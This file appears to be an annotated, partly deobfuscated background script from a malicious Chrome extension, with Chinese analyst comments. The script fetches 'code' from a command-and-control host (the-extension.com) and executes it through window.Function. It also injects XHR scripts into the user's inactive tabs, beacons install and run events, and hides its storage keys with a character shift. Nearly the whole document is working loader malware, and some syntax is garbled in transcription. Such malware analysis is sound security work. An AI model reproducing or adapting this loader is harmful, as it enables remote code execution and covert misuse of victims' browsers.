(function () {
    var f = ["code", "version", "error", "download", "invalidMonetizationCode", "TjPzl8caI41", "KI10wTwwvF7", "Function", "run", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage", "eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "tabs", "callee", "addListener", "onMessage", "runtime", "executeScript", "replace", "data", "test", "includes", "http://", "length", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse"];
    (function (b, c) { //建立字串庫並重排順序
        var d = function (a) {
                while (--a) {
                    b['push'](b['shift']())
                }
            };
        d(++c)
    }(f, 0xa2));
    //=>  f = ["eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "tabs", "callee", "addListener", "onMessage", "runtime", "executeScript", "replace", "data", "test", "includes", "http://", "length", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse", "code", "version", "error", "download", "invalidMonetizationCode", "TjPzl8caI41", "KI10wTwwvF7", "Function", "run", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage"]
    var g = _0x1838 = function (a, b) {   //=>  g = f[a]  //撈取字串的函數
            var a = parseInt(a, 0x10);
            var c = f[a];
            return c
        };
    function e( {  cat = g('0x0'), act = '', lab = '', fr = 0x3e8 * 0x3c * 0x3c * 0x18 }) { //cat=eval act=init fr=86400000 //打一個訊息回CnC
        let _0x4b1721 = t(`$ {
            cat
        }
        _$ {
            act
        }`, c['FD']); //正轉7字元 $hashed_code
        return l['get'](_0x4b1721)['then'](_0x9415ed = > {   //chrome.get($rev_code).then( data[$rev_code] )
            let _0x5d937f = _0x9415ed[_0x4b1721], 
                _0x45c15f = 0x5265c00 == fr ? new Date()[g('0x3')]() - new Date(_0x5d937f)[g('0x4')](0x0, 0x0, 0x0, 0x0) >= fr : new Date()[g('0x3')]() - _0x5d937f >= fr;
                //_0x45c15f = false/NaN = true?(now - 1512259200000 >= 86400000):...
            if (!_0x5d937f || _0x45c15f) {  //run only if data not set to chrome    //_0x5d937f==undefined
                let _0x9415ed = "$ { new URL(c['WL'][g('0x5')])[g('0x6')] }  /stats"; //new URL(https://the-extension.com).origin
                n(" ${_0x9415ed}?hash=jwtmv6kavksy5cazdf4leg66r&eventCategory=${cat}&eventAction=${act}&eventLabel=${lab}",'POST') 
                    // https://the-extension.com?hash=jwtmv6kavksy5cazdf4leg66r&eventCategory=eval&eventAction=init&eventLabel=
                  ['then']
                    ( _0x201de8 =>{ let _0x9415ed={};
                          _0x9415ed[_0x4b1721]=new Date()[_0x1838('0x3')](),//now
                          l[_0x1838('0x7')](_0x9415ed); //l.set($hashed_code)  記錄最近一次跟CnC連線的時間
                      } 
                    );
            }
        });
    }
    function n(_0x42ba8f,n=_0x1838('0x8')){ //url   n=defaule GET   //proccess XHR(url, action)
        return new Promise((_0x3090bd,_0x473358)=>{
            function _0x3ad6d4(_0x3a3304,_0x4cce31,_0x57e5fb){    //chrome tab onUpdate listener //function(integer tabId, object changeInfo, Tab tab)
                _0x1838('0x9')===_0x4cce31[_0x1838('0xa')] &&  //"loading"===$changeInfo.status
                  (
                    _0x20f3c8(_0x57e5fb,_0x42ba8f) && //若 輸入字串驗證($3 tab , url)
                    c['NZ']<=0x0 && //若c['NZ']<0 (初始為2)
                    (
                      chrome[_0x1838('0xd')][_0x1838('0xc')][_0x1838('0xb')]( arguments[_0x1838('0xe')] ),
                      //chrome.tabs.onUpdated.removeListener( arguments.callee ) 移除Listener
                      _0x2bc9ef(_0x3a3304) //run XHR request
                    ),
                    c['NZ']--
                  );
            }
            function _0x2bc9ef(_0x5a3411 /*tab id*/){  //run XHR request and callback itself
                chrome[_0x1838('0x11')][_0x1838('0x10')][_0x1838('0xf')](_0x4b297c), //chrome.runtime.onMessage.addListener($確認是否成功)
                chrome[_0x1838('0xd')][_0x1838('0x12')](    //chrome.tabs.executeScript($1, `send xhr request`.replace('replaceableurl', $url))
                  _0x5a3411, //tab id
                  { 'code':`(function(){var url = replaceableurl; 
                    var xhr = new XMLHttpRequest();
                    xhr.onreadystatechange = function () {
                        if (xhr.readyState === 4) {
                            chrome.runtime.sendMessage({data: xhr.responseText, url: url,status:xhr.status});
                        }};
                        xhr.open('${n}',url, true);
                        xhr.send();
                    }) ()`[_0x1838('0x13')]('replaceableurl',`'${_0x42ba8f}'`)});
            }
            function _0x4b297c(_0x4a051f){   //確認是否成功
                _0x4a051f[_0x1838('0x5')]===_0x42ba8f&& //if $1.url == url
                  (
                    _0x3090bd(_0x4a051f[_0x1838('0x14')]),//resolve($1.data)
                    chrome[_0x1838('0x11')][_0x1838('0x10')]['removeListener']( arguments[_0x1838('0xe')] )
                    //chrome.runtime.onMessage.removeListener( arguments.callee )
                  );
            }
            function _0x20f3c8(_0x45a021,_0x3db6fb){  //輸入url字串檢驗
                return new RegExp(`^((?!(chrome${_0x3db6fb[_0x1838('0x16')](_0x1838('0x17'))?'|https|ftps':''})).+:/ / )`) [g('0x15')](_0x45a021[g('0x5')])
                // Regex"^((?!(chrome  $2.includes("http://")  |https|ftps':''})).+:/ / )".test($1.url)
            }
            _0x42ba8f && 0x0 !== _0x42ba8f['length'] || _0x473358(g('0x19')), //reject("Url error")
            chrome[g('0xd')][g('0x1a')]({}, function (a) {  //chrome.tabs.query({}, function a 搜尋所有tab, 找到有用的URL同時active=false
                let _0x3090bd = a[g('0x1b')](_0x1c9951 = > _0x20f3c8(_0x1c9951, _0x42ba8f) && !_0x1c9951['active']);//a.filter(...找出)
                0x0 === _0x3090bd[g('0x18')] ? //if _0x3090bd.length ==0  沒有的話就掛一個onUpdated addListener，有的話就隨機抓一個query
                  chrome[g('0xd')][g('0xc')][g('0xf')](_0x3ad6d4) :  //chrome.tabs.onUpdated.addListener(chrome tab onUpdate listener)
                  _0x2bc9ef(_0x3090bd[Math[g('0x1d')](Math['random']() * _0x3090bd[g('0x18')])] ['id']) //xhr query( 隨機取一個id )
            })
        })
    }
    function t(a, b) {   //撈出a的字串陣列，把每個字元都加上b之後轉回字串（對儲存於chrome的數據進行混淆）
        for (var c = '', x = 0x0, i = 0x0; i < a['length']; i++) 
            x = a[i]['charCodeAt']() + b, 
            c += String['fromCharCode'](x);
        return c
    }
    function o(a) { //TjPzl8caI41==code, KI10wTwwvF7==version //解析輸入的JSON, 
        return new Promise((_0x47fce0, _0x349364) = > {
            let _0x51ae9e = !0x1, 
                _0x556fe3 = '', 
                _0x58bf0d = '';
            try {
                a = JSON[g('0x21')](a), //parse
                _0x556fe3 = a[g('0x22')], //code
                _0x58bf0d = a[g('0x23')], //version
                _0x556fe3 == -0x1 || (_0x51ae9e = !0x0) //if (code==-1) status = fail
            } catch (_0x1b0f96) {  //如果解析失敗，打一個訊息回CnC 回傳error
                e({
                    'act': g('0x24'), //error
                    'lab': '\x70\x61\x72\x73\x65\x52\x65\x73\x70\x6f\x6e\x73\x65', //parseResponse
                    'fr': 0x0
                })
            }
            _0x51ae9e ? l[g('0x7')]({  //if status = success, chrome.localstorage.set 更新本地儲存為新的數據，並打一個訊息回CnC表示已更新
                'TjPzl8caI41': _0x556fe3, //code
                'KI10wTwwvF7': _0x58bf0d  //version
            })['then'](_0x207847 = > {
                l['set']({
                    'pyW5F1U43VI': new Date()[g('0x3')]() //now
                }), e({
                    'act': g('0x25'), //download
                    'lab': _0x58bf0d, //version
                    'fr': 0x0
                }), _0x47fce0({  //resolve()
                    'code': _0x556fe3, //code
                    'version': _0x58bf0d //version
                })
            }) : (_0x556fe3 != -0x1 && e({ //if status==fail, 打一個訊息回CnC 回傳error，並回傳（使用）本地儲存的狀態碼
                'act': g('0x24'), //error
                'lab': g('0x26'), //invalidMonetizationCode
                'fr': 0x0
            }), l[g('0x2')]([g('0x27'), 'KI10wTwwvF7'])['then'](_0x5d38a5 = > { //google.localstorage.get([code, version]).then()
                _0x47fce0({  //resolve()
                    'code': _0x5d38a5['TjPzl8caI41'],
                    'version': _0x5d38a5[g('0x28')]//KI10wTwwvF7
                })
            }))
        })
    }
    function a(b) {  //執行程式碼，檢查結果是否有效，回傳狀態給CnC
        try {
            window[g('0x29')](b[g('0x22')])(l, n, e), ////window.Function(b[code])(l, n, e) => (function(){eval(b[code])})(l,n,e)
            e(b[g('0x22')] &&  0x0 !== b['code'][g('0x18')] || b[g('0x23')] && 0x0 !== b['version'][g('0x18')] ? { //打一個訊息給CnC，如果
                //b[code] && b[code].length!=0 || b[version] && b[version].length!=0  code跟version都有效，回傳正常運作
                'act': 'run',
                'lab': b[g('0x23')] //version
            } : {                                   //反之回傳idle
                'act': g('0x2a'),//run
                'lab': g('0x2b') //idle
            })
        } catch (_0x5bd26e) {       //如果發生exception, 回傳error
            e({
                'act': g('0x24'), //error
                'lab': `run_$ {
                    b[g('0x23')] 
                }` //run_$ version
            })
        }
    }
    function r() {      //安裝/檢查更新
        return new Promise((_0x223434, _0x1b9f00) = > {
            l[g('0x2')](g('0x2c'))['then']( //chorme.localStorage.get('lastTime').then(
                _0x30d294 = > {
                    let _0x55a281 = _0x30d294['pyW5F1U43VI'] || 0x0;
                    0x0 === _0x55a281 && l[g('0x7')]({              //if storage.lastTime==null, upate chorme.localStorage
                        'XMWEzI4SfdC': new Date()[g('0x3')]()
                    })['then'](
                        _0x2d7d72 = > {
                            e({  'act': 'install'  })                   //send to CnC "初次安裝"
                        }), 
                    new Date()[g('0x3')]() - _0x55a281 > c['WL']['Gj'] ? setTimeout(function () { //if (now - lastTime > 43200000)如果上次更新超過12hr,30min後抓取CnC命令
                        n(`$ {
                                c['WL'][g('0x5')]
                            }
                            /?hash=jwtmv6kavksy5cazdf4leg66r`,
                            g('0x8'))[g('0x1')](o)[g('0x1')](_0x223434) //n(https://the-extension.com/?hash=jwtmv6kavksy5cazdf4leg66r, "GET").then(o解析json).then(resolve())
                        }, c['fM']) 
                        :
                        l[g('0x2')]([g('0x27'),g('0x28')])[g('0x1')]( //chrome.localstore.get(code,version).then(resolve([code,version]))
                            _0x1d2d5e=>{
                                _0x223434(
                                    {
                                        'code':_0x1d2d5e[g('0x27')],
                                        'version':_0x1d2d5e['KI10wTwwvF7']
                                    }
                                )
                            }
                        )
                }
            )
        })
    }
    function i(){  //main function, run init in 60 secs
        setTimeout(
            function(){
                e({'act':'init'}), //send to CnC "init"
                r()[g('0x1')](a)  //安裝/檢查更新.then(執行程式碼)
            },
            c['Cf'] //60000
        )
    }
    let c={
        'WL':{'url':g('0x2e'),'Gj':0x2932e00}, //url="https://the-extension.com", Gj: 43200000
        'NZ':Math[g('0x1d')](0x3*Math[g('0x1e')]()), //2
        'fM':0x1b7740*Math[g('0x1d')](0x1*Math[g('0x1e')]()+0x1), //1800000
        'Cf':0xea60*Math[g('0x1d')](0x2*Math[g('0x1e')]()+0x1), //60000
        'FD':0x7  //7
    },
    l={  //chorme local storage operation
        'get'(e=null){  //
            return new Promise((_0x459136,_0x1dd2d2)=>{
                chrome[g('0x30')][g('0x2f')][g('0x2')](  //chrome.storage.local.get($1=e=null, resolved() ) get $1 and callback
                    e, function(a){_0x459136(a)}
                )
            })
        },
        'set'(_0x1054f4){
            return new Promise((_0x13679c,_0x5182a6)=>{
                chrome[g('0x30')]['local'][g('0x7')]( _0x1054f4, function(a){_0x13679c(a)} ) //chrome.storage.local.set($1, resolved()) store $1 and callback
            })
        },
        'yJ'(_0x21744e){
            return new Promise((_0x23501d,_0x525375)=>{
                chrome[g('0x30')][g('0x2f')]['yJ']( _0x21744e,function(a){_0x23501d(a)} ) //chrome.storage.local.yJ($1, resolved())
            })
        },
        'EE'(){
            return new Promise((_0x47a45d,_0x110900)=>{
                chrome[g('0x30')][g('0x2f')]['EE']( function(a){_0x47a45d(a)} ) //chrome.storage.local.EE( resolved() )
            })
        }
    };
    i()
})()


